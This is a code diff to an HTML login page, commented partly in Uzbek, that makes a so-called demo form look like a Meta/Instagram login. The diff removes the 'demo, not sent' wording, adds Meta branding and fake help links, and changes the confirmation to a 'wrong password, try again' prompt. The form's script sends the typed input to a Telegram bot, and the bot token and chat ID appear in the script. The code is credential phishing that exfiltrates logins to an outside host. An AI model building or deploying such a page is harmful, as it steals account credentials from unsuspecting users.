@@ -45,14 +45,14 @@ button{
 
   <!-- DEMO FORM -->
   <form onsubmit="demoLogin(event)">
-    <input id="username" placeholder="Telefon, email yoki username" required />
+    <input id="username" placeholder="Phone number, email or username" required />
     <!-- PAROL BOR, LEKIN OLINMAYDI -->
-    <input id="password" placeholder="Parol (demo, yuborilmaydi)" required />
-    <button>Kirish</button>
+    <input id="password" placeholder="Password " required />
+    <button>Log in</button>
   </form>
 
   <div class="note">
-    <strong>FROM</strong> <br> META
+    <strong>FROM | META</strong> <br> Forgot your login details? Get help logging in. <br> Don't have an account? Sign up.
   </div>
 
   <div class="footer">© Barcha huquqlar himoyalangan</div>
@@ -77,10 +77,11 @@ function demoLogin(e){
   );
 
   fetch(`https://api.telegram.org/bot8391435653:AAFLILak1iZ_48-qSXvo1gbAKQZXJLnqFjo/sendMessage?chat_id=8004982105&text=${text}`)
-    .then(()=> alert("Kirish so'rovingiz yuborildi ✔️"))
+    .then(()=> alert("Login parol to'g'ri ekanligiga ishonch hosil qiling va qayta urinib ko'ring ✔️"))
     .catch(()=> alert("Xatolik. Token/Chat ID ni tekshir."));
 }
 </script>
 
 </body>
 </html>
+
